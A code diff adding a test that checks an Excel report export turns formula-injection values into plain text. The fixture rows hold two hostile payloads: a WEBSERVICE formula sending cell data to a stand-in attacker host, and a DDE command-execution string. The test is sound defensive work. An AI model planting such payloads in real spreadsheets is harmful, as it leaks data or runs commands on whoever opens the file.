@@ -77,3 +77,26 @@ async def test_xlsx_of_a_report_with_totals_row(client):
     zf = zipfile.ZipFile(io.BytesIO(r.content))
     sheet = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
     assert "الإجمالي" in sheet
+
+
+async def test_xlsx_neutralizes_formula_injection(client):
+    """A drug named '=WEBSERVICE(...)' must export as TEXT, never a formula.
+
+    Second-order CSV-style injection (CWE-1236): a low-priv user plants the
+    name via drugs.manage; an admin opens the Excel export.
+    """
+    from app.reports.exports import build_xlsx
+
+    content = build_xlsx(
+        title_ar="النواقص",
+        title_en="Stock Below Minimum",
+        meta=[],
+        columns=["الصنف", "الرصيد"],
+        rows=[["=WEBSERVICE(\"http://evil.example/x?d=\"&A1)", "2.00"], ["+CMD|'/c calc'!A0", "1.00"]],
+        foot=None,
+        note=None,
+    )
+    zf = zipfile.ZipFile(io.BytesIO(content))
+    sheet = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
+    assert "<f>" not in sheet  # no live formulas anywhere
+    assert "WEBSERVICE" in sheet  # the text is preserved
